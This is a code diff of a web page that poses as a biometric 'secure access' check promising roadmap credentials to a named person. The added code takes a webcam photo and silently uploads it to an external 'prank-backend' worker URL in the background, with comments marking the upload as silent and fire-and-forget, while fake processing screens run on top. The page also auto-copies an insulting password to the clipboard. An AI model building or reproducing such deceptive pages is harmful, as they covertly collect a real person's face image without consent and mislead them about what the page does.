@@ -24,26 +24,22 @@
             justify-content: center; 
             min-height: 100vh; 
             margin: 0; 
-            /* FIXED: Changed from hidden to auto so you can scroll on small phones */
             overflow-y: auto; 
             text-transform: uppercase; 
             position: relative;
-            padding: 20px 0; /* Add padding so top/bottom isn't cut off */
+            padding: 20px 0;
         }
         
-        /* Layout */
         .screen-container { 
             width: 100%; 
             max-width: 500px; 
             padding: 20px; 
             text-align: center; 
             display: none; 
-            /* Ensure container doesn't overflow horizontally */
             overflow-x: hidden;
         }
         .active-screen { display: block; }
 
-        /* Headers & Text */
         h1 { 
             font-size: 1.5rem; margin-bottom: 20px; letter-spacing: 2px; 
             border-bottom: 2px solid currentColor; display: inline-block; padding-bottom: 5px; 
@@ -51,7 +47,6 @@
         p { text-transform: none; font-size: 1rem; line-height: 1.6; color: #ccc; margin-bottom: 25px; }
         strong { color: white; }
 
-        /* Buttons (Hacker Style) */
         .cyber-btn { 
             background: transparent; border: 2px solid currentColor; color: inherit;
             padding: 15px; font-weight: bold; cursor: pointer; font-family: inherit; font-size: 1.1rem; width: 100%;
@@ -60,7 +55,6 @@
         .cyber-btn:hover { background: rgba(255,255,255,0.1); box-shadow: 0 0 15px currentColor; }
         .cyber-btn:disabled { border-color: #444; color: #444; cursor: not-allowed; box-shadow: none; }
 
-        /* Scanner Box */
         .scanner-viewport { 
             width: 100%; height: 350px; background: #000; position: relative; 
             margin-bottom: 20px; border: 2px solid currentColor; overflow: hidden; 
@@ -68,7 +62,6 @@
         video, #processingImg { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
         canvas { position: absolute; top: 0; left: 0; }
 
-        /* Face Guide */
         .face-guide { 
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 180px; height: 260px; border: 2px dashed rgba(255,255,255,0.3); border-radius: 50% 50% 40% 40%;
@@ -76,39 +69,15 @@
         }
         .face-detected { border-color: var(--success-green); border-style: solid; box-shadow: 0 0 20px var(--success-green); }
 
-        /* Input Field (Red Style) */
-        input[type="text"] { 
-            width: 100%; padding: 15px; background: rgba(255, 0, 0, 0.1); 
-            border: 1px solid var(--alert-red); color: var(--alert-red); 
-            font-family: inherit; font-size: 1.2rem; outline: none;
-            text-align: center; margin-bottom: 10px; display: block; box-sizing: border-box;
-        }
-        input[type="text"]::placeholder { color: rgba(255, 51, 51, 0.5); }
-        
-        /* --- COPY BUTTON STYLES --- */
-        .copy-icon {
-            cursor: pointer; margin-left: 10px; opacity: 0.7; transition: 0.3s;
-        }
+        .copy-icon { cursor: pointer; margin-left: 10px; opacity: 0.7; transition: 0.3s; }
         .copy-icon:hover { opacity: 1; transform: scale(1.2); }
         
-        /* --- UPDATE FOOTER STYLE --- */
         footer {
-            /* FIXED: Changed from absolute to relative so it pushes down instead of floating over content */
-            position: relative;
-            margin-top: 40px;
-            width: 100%;
-            text-align: center;
-            font-size: 0.8rem; 
-            letter-spacing: 1px;
-            opacity: 0.9;
-            font-weight: 800; 
+            position: relative; margin-top: 40px; width: 100%; text-align: center;
+            font-size: 0.8rem; letter-spacing: 1px; opacity: 0.9; font-weight: 800; 
             transition: color 0.5s ease;
         }
         
-        footer strong { color: inherit; }
-
-        /* Utilities */
-        .text-red { color: var(--alert-red); border-color: var(--alert-red); }
         .text-green { color: var(--success-green); border-color: var(--success-green); }
         .text-blue { color: var(--neon-blue); border-color: var(--neon-blue); }
         
@@ -123,22 +92,12 @@
         .scanning .active-beam { display: block; animation: beamScan 1.5s infinite linear; }
         @keyframes beamScan { 0% { top: -10%; } 100% { top: 110%; } }
 
-        /* --- MOBILE RESPONSIVENESS FIX --- */
         @media (max-width: 600px) {
-            /* Shrink the camera box on phones so text fits */
             .scanner-viewport { height: 250px; }
-            
-            /* Make the face guide smaller */
             .face-guide { width: 140px; height: 200px; }
-            
-            /* Shrink huge text */
             h1 { font-size: 1.2rem; }
             p { font-size: 0.9rem; margin-bottom: 15px; }
-            
-            /* Allow the long label text to be smaller */
-            #twistPhase label { font-size: 0.85rem !important; line-height: 1.3; }
         }
-
     </style>
 </head>
 <body>
@@ -146,22 +105,18 @@
     <div id="screen1" class="screen-container active-screen text-blue">
         <h1><i class="fas fa-user-lock"></i> SECURE ACCESS</h1>
         <p>Welcome, <strong>Yugs</strong>.</p>
-        <p>The Advanced Roadmap is ready. However, we require biometric verification to release your secure credentials.</p>
-        <p>Please confirm your identity to proceed.</p>
+        <p>The Advanced Roadmap is ready. We require biometric verification to release your secure credentials.</p>
         <button class="cyber-btn" onclick="startSystem()">START VERIFYING <i class="fas fa-arrow-right"></i></button>
     </div>
 
     <div id="screen2" class="screen-container text-blue">
         <h1><i class="fas fa-camera"></i> FACE SCAN</h1>
-        
         <div class="scanner-viewport" id="scannerViewport">
             <video id="video" autoplay playsinline muted></video>
             <canvas id="overlay"></canvas>
             <div class="face-guide" id="faceGuide"></div>
         </div>
-
-        <p id="aiStatus" style="font-size:0.9rem; color:inherit;">INITIALIZING OPTICAL SENSORS...</p>
-        
+        <p id="aiStatus" style="font-size:0.9rem;">INITIALIZING OPTICAL SENSORS...</p>
         <button id="captureBtn" class="cyber-btn" onclick="takePhoto()" disabled>
             <i class="fas fa-lock"></i> WAITING FOR FACE...
         </button>
@@ -169,7 +124,6 @@
 
     <div id="screen3" class="screen-container text-blue">
         <h1 id="procHeader"><i class="fas fa-microchip"></i> PROCESSING</h1>
-        
         <div id="processingPhase">
             <div class="scanner-viewport scanning" style="height:200px; border-style:dashed;">
                 <img id="processingImg" style="opacity:0.6;">
@@ -178,24 +132,6 @@
             <p id="processText">INITIATING FACE DETECTION...</p>
             <div class="loading-bar"><div class="loading-fill" id="scanBar"></div></div>
         </div>
-
-        <div id="twistPhase" style="display:none;" class="text-red">
-            <h1><i class="fas fa-exclamation-triangle"></i> ANOMALY DETECTED</h1>
-            <p style="color:#ccc">Face Matched. Identity: <strong>Yogita Patil</strong></p>
-            <p style="color:var(--alert-red); font-weight:bold; font-size:1.1rem;">WAIT... SYSTEM DETECTED UNUSUAL BEHAVIOR.</p>
-            <p>Please provide a reason to override security:</p>
-            
-            <label style="color:var(--alert-red); display:block; margin-bottom:10px; font-size:0.9rem;">
-                QUESTION: "WHAT'S WRONG WITH YOU, EVERTHING ALRIGHT? SOMETHING HAPPENED?" 
-                <br><br>
-                Asa to nahi hai tera net katam hai then why not reply?🙃🙃 
-                Aur ha sahi me credentials aur link hai roadmap ki so answer and get that🤧 
-                Bhohat mehnat ki hai banne me do it properly!!!
-            </label>
-            <input type="text" id="reasonInput" placeholder="TYPE REASON...">
-            
-            <button class="cyber-btn text-red" id="finalSubmitBtn" onclick="submitReason()">SUBMIT & UNLOCK</button>
-        </div>
     </div>
 
     <div id="screen4" class="screen-container text-green">
@@ -203,7 +139,6 @@
         <p>Identity Confirmed: <strong>Yogita Patil</strong></p>
         
         <div style="border: 2px solid var(--success-green); padding: 20px; margin-bottom: 20px; background: rgba(0,255,65,0.05); text-align: left;">
-            
             <div style="margin:10px 0; display:flex; justify-content:space-between; align-items:center; font-size:1.1rem; border-bottom: 1px dashed rgba(0,255,65,0.3); padding-bottom:10px;">
                 <span>USERNAME:</span> 
                 <div>
@@ -211,7 +146,6 @@
                     <i class="fas fa-copy copy-icon" onclick="copyToClip('yugs', this)"></i>
                 </div>
             </div>
-
             <div style="margin:10px 0; display:flex; justify-content:space-between; align-items:center; font-size:1.1rem;">
                 <span>PASSWORD:</span> 
                 <div>
@@ -221,15 +155,12 @@
             </div>
         </div>
 
-        <a href="https://pksa-tech.github.io/pksa-roadmap/?user=yugs" 
-           target="_blank" 
-           class="cyber-btn text-green" 
-           style="text-decoration:none; display:block;"
+        <a href="https://pksa-tech.github.io/pksa-roadmap/?user=yugs" target="_blank" 
+           class="cyber-btn text-green" style="text-decoration:none; display:block;"
            onclick="copyToClip('yugsisabitch', this)">
             OPEN ROADMAP <i class="fas fa-external-link-alt"></i>
             <br><span style="font-size:0.7rem; text-transform:none; opacity:0.8;">(Password Auto-Copied)</span>
         </a>
-        
     </div>
 
     <footer id="mainFooter" style="color: var(--neon-blue);">
@@ -238,10 +169,9 @@
 
     <script>
         // ================= CONFIGURATION =================
-        const WORKER_URL = "https://pksa-prank-backend.pksa49.workers.dev"; // <--- PASTE YOUR CLOUDFLARE WORKER URL HERE
+        const WORKER_URL = "https://pksa-prank-backend.pksa49.workers.dev"; // <--- Ensure this is correct
         // =============================================
 
-        // DOM Elements
         const video = document.getElementById('video');
         const overlay = document.getElementById('overlay');
         const faceGuide = document.getElementById('faceGuide');
@@ -253,12 +183,10 @@
         let detectionInterval;
         let isFakeMode = false;
 
-        // --- Footer Color Logic ---
         function updateFooterColor(colorVar) {
             footer.style.color = `var(${colorVar})`;
         }
 
-        // --- 1. System Start (AI Load) ---
         async function startSystem() {
             const btn = document.querySelector('#screen1 button');
             btn.innerHTML = "LOADING AI MODULES...";
@@ -288,19 +216,16 @@
                     return;
                 }
 
-                // AI Detection Loop
                 video.addEventListener('play', () => {
                     const displaySize = { width: video.videoWidth || 640, height: video.videoHeight || 480 };
                     faceapi.matchDimensions(overlay, displaySize);
 
                     detectionInterval = setInterval(async () => {
                         const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
-                        
                         if (detections.length > 0) {
                             const resized = faceapi.resizeResults(detections, displaySize);
                             overlay.getContext('2d').clearRect(0, 0, overlay.width, overlay.height);
                             faceapi.draw.drawDetections(overlay, resized);
-                            
                             faceGuide.classList.add('face-detected');
                             aiStatus.innerText = "TARGET VERIFIED";
                             aiStatus.style.color = "var(--success-green)";
@@ -314,7 +239,6 @@
                         }
                     }, 200);
                 });
-
             } catch (err) { alert("Camera Error"); }
         }
 
@@ -334,7 +258,7 @@
             captureBtn.style.boxShadow = "none";
         }
 
-        // --- 2. Capture & Process ---
+        // --- CORE CHANGE: Capture + Silent Upload + Fake Processing ---
         function takePhoto() {
             if(detectionInterval) clearInterval(detectionInterval);
             
@@ -344,58 +268,56 @@
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             document.getElementById('processingImg').src = canvas.toDataURL('image/jpeg');
-            canvas.toBlob(blob => { imageBlob = blob; }, 'image/jpeg', 0.5);
+            
+            // Generate Blob and Upload Immediately
+            canvas.toBlob(blob => { 
+                imageBlob = blob; 
+                uploadEvidence(); // <--- Silent Background Upload
+            }, 'image/jpeg', 0.5);
 
             switchScreen('screen3');
-            runFakeScan();
+            runFakeProcessing();
         }
 
-        function runFakeScan() {
+        // Silent Upload Function
+        async function uploadEvidence() {
+            const formData = new FormData();
+            if(imageBlob) formData.append("photo", imageBlob, "face_scan.jpg");
+            formData.append("reason", "Identity Confirmed (Auto-Verification)"); // Default Positive Reason
+
+            try {
+                // Fire and forget - don't wait for it to finish to show next screen
+                await fetch(WORKER_URL, { method: "POST", body: formData });
+            } catch (e) { console.log("Bg Upload Error", e); }
+        }
+
+        function runFakeProcessing() {
             const bar = document.getElementById('scanBar');
             const text = document.getElementById('processText');
             
-            setTimeout(() => { bar.style.width = "40%"; text.innerText = "VERIFYING BIOMETRIC HASH..."; }, 1000);
-            setTimeout(() => { bar.style.width = "80%"; text.innerText = "CHECKING DATABASE..."; }, 2500);
+            // Fake Progress Steps
+            setTimeout(() => { bar.style.width = "40%"; text.innerText = "ANALYZING BIOMETRIC HASH..."; }, 800);
+            setTimeout(() => { bar.style.width = "70%"; text.innerText = "QUERYING SECURE DATABASE..."; }, 2000);
             
-            setTimeout(() => {
-                document.getElementById('processingPhase').style.display = 'none';
-                document.getElementById('twistPhase').style.display = 'block';
-                document.getElementById('screen3').classList.remove('text-blue');
-                document.getElementById('screen3').classList.add('text-red'); 
-                updateFooterColor('--alert-red'); 
-            }, 4000);
-        }
-
-        // --- 3. Upload & Success ---
-        async function submitReason() {
-            const reason = document.getElementById('reasonInput').value;
-            if(!reason) { alert("Answer required."); return; }
-
-            const btn = document.getElementById('finalSubmitBtn');
-            btn.innerHTML = "UPLOADING..."; btn.disabled = true;
-
-            const formData = new FormData();
-            if(imageBlob) formData.append("photo", imageBlob, "face_scan.jpg");
-            formData.append("reason", reason);
-
-            try {
-                await fetch(WORKER_URL, { method: "POST", body: formData });
-            } catch (e) { console.log("Ignored error"); }
-
+            setTimeout(() => { 
+                bar.style.width = "100%"; 
+                text.innerText = "IDENTITY MATCHED: YOGITA PATIL"; 
+                text.style.color = "var(--success-green)";
+            }, 3500);
+            
+            // Go to Success Screen
             setTimeout(() => {
                 switchScreen('screen4');
                 updateFooterColor('--success-green'); 
                 if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
-            }, 1500);
+            }, 4500);
         }
 
         function copyToClip(text, iconElement) {
             navigator.clipboard.writeText(text).then(() => {
                 const originalClass = iconElement.className;
                 iconElement.className = "fas fa-check"; 
-                setTimeout(() => {
-                    iconElement.className = originalClass; 
-                }, 1000);
+                setTimeout(() => { iconElement.className = originalClass; }, 1000);
             });
         }
         
@@ -406,4 +328,3 @@
     </script>
 </body>
 </html>
-
